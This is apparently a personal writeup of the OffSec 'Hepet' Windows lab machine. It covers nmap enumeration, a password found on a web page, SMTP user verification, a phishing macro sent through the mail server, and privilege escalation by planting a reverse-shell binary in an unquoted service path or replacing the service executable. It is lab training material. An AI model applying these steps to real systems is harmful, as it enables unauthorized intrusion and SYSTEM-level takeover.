---
title: "Hepet"
date: 2026-04-01
draft: false
description: "OffSec Hepet writeup"
tags: ["windows", "hard", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Hepet

## Overview

- **OS:** Windows
- **IP:** 192.168.139.140
- **Difficulty:** Hard
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Initial access with email macro and privesc with PowerUp.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury Mail Transport System pop3d
|_pop3-capabilities: TOP EXPIRE(NEVER) UIDL APOP USER
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: X-MERCURY-1A0001 AUTH=PLAIN CAPABILITY OK complete IMAP4rev1
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Time Travel Company Page
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-title: Time Travel Company Page
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    Unknown security type (40)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Network Distance: 4 hops
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-01T13:48:04
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   81.75 ms 192.168.45.1
2   81.71 ms 192.168.45.254
3   82.12 ms 192.168.251.1
4   82.20 ms 192.168.139.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.58 seconds

```

## Dirbusting

```

```

## Port 8000

{{< figure src="image 955.png" >}}

got a list of usernames aswell

{{< figure src="image 956.png" >}}

and for some reason i think Jonas has his password out Jonas K. : SicMundusCreatusEst

Verifying usernames

```
smtp-user-enum -M VRFY -U users.txt -t 192.169.139.140
```

this gives us agnes magnus charlotte martha and jones as active users

## IMAP

we were able to access the imap server w the creds we found earlier

{{< figure src="image 957.png" >}}

on reading the mails we see that all the spreadsheets and documents are being processed in the mail server first to check compatibility

{{< figure src="image 958.png" >}}

## Exploitation

github.com/0bfxgh0st/MMG-LO

lets use this to generate our macro

modify accordingly

{{< figure src="image 959.png" >}}

{{< figure src="image 960.png" >}}

{{< figure src="image 961.png" >}}

and boom we got a connection

{{< figure src="image 962.png" >}}

lets modify this service to run our payload

{{< figure src="image 963.png" >}}

we could go this route

```
Write-ServiceBinary -Name "VeyonService" -Path "C:\Users\Ela Arwel\Veyon\veyon-service.exe" -UserName "hacker" -Password "P@ssw0rd123!"
```

but lets just use the rev.exe

because it is unqoted we r doin this

```
Because there is a space in the path (Ela Arwel) and no quotes, Windows parses it from left to right and tries these possible executables in order:

C:\Users\Ela.exe               ← (unlikely, you probably can't write here)
C:\Users\Ela Arwel\Veyon\veyon.exe   ← This is where you can write!
C:\Users\Ela Arwel\Veyon\veyon-service.exe (the real one)

As soon as Windows finds a valid .exe at step 2 (veyon.exe), it runs that one and stops checking.
So your malicious veyon.exe gets executed as LocalSystem, and the real veyon-service.exe is completely ignored.
```

```
copy "C:\Users\Public\Documents\rev.exe" "C:\Users\Ela Arwel\Veyon\veyon.exe" -Force
```

OR replace the entire binary

```
move "C:\Users\Ela Arwel\Veyon\veyon-service.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.exe.bak" -Force
move "C:\Users\Public\Documents\rev.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.exe" -Force
```

now if we shutdown /r /t 0 we shud get a shell in sometime

cvdf

{{< figure src="image 964.png" >}}
